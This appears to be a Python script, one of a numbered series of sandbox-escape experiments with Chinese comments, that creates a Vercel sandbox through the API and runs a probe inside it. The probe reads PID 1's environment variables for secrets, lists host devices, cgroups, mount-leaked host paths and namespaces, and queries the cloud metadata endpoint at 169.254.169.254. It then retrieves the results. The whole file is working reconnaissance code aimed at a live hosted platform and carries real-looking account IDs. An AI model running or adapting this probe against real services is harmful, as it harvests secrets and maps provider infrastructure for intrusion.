# 实验J140: 宿主面批量探测 — environ秘密 + virtio/9p设备 + cgroup布局 + /run/cell残留 + 元数据服务
# 前提: j139 确认 mount 可用(CAP_SYS_ADMIN), mountinfo 泄露宿主路径 /volumes/run/vercel/share 与 /run/cell/ca-cert.pem
# 方法: API cmd 与攻击 Spawn 权限相同(uid1000+全caps+同ns) -> 直接用 API cmd 探测, 无需攻击链
# 零破坏: 纯读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj140"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, subprocess, socket
out = open("/tmp/d140.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

p("=== ENVIRON ===")
p(open("/proc/1/environ", "rb").read().replace(b"\x00", b"\n").decode("latin1", "replace")[:4000])
p("=== DEV ===")
p(sh("ls -la /dev/"))
p("=== PARTITIONS ===")
p(sh("cat /proc/partitions"))
p("=== VIRTIO ===")
p(sh("ls -la /sys/bus/virtio/devices/ 2>&1; for d in /sys/bus/virtio/devices/*/; do echo --$d; cat $d/modalias 2>/dev/null; ls -la $d/driver 2>/dev/null; done"))
p("=== CGROUP ===")
p(sh("find /sys/fs/cgroup -maxdepth 3 -type d 2>/dev/null | head -60"))
p("=== CELL ===")
p(sh("ls -la /run/cell/ 2>&1; echo ---; ls -la /volumes/ 2>&1; echo ---; ls -la /volumes/run 2>&1; echo ---; ls -la /volumes/run/vercel 2>&1"))
p("=== SHARE ===")
p(sh("ls -la /run/vercel/share/"))
p("=== PROC1_STATUS ===")
p(sh("head -60 /proc/1/status; echo ---; tr '\\0' ' ' < /proc/1/cmdline; echo"))
p("=== NET ===")
p(sh("ip addr 2>&1 | head -20; echo ---; ip route 2>&1; echo ---; cat /etc/resolv.conf; echo ---; hostname"))
p("=== META ===")
try:
    s = socket.create_connection(("169.254.169.254", 80), timeout=3)
    s.send(b"GET / HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n")
    d = s.recv(2000)
    s.close()
    p("META:", d[:500])
except Exception as e:
    p("META_EXC", repr(e))
p("=== RUN ===")
p(sh("ls -la /run/"))
p("=== PROC1_MAPS_HEAD ===")
p(sh("head -20 /proc/1/maps"))
p("=== PROC1_NS ===")
p(sh("ls -la /proc/1/ns/ 2>&1; readlink /proc/1/ns/mnt 2>&1; readlink /proc/self/ns/mnt 2>&1"))
p("=== DONE")
out.close()
"""

run_cmd(sid, PROBE, "host-probe")
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d140.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d140 status {c2} ===", flush=True)
print(r2[:10000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
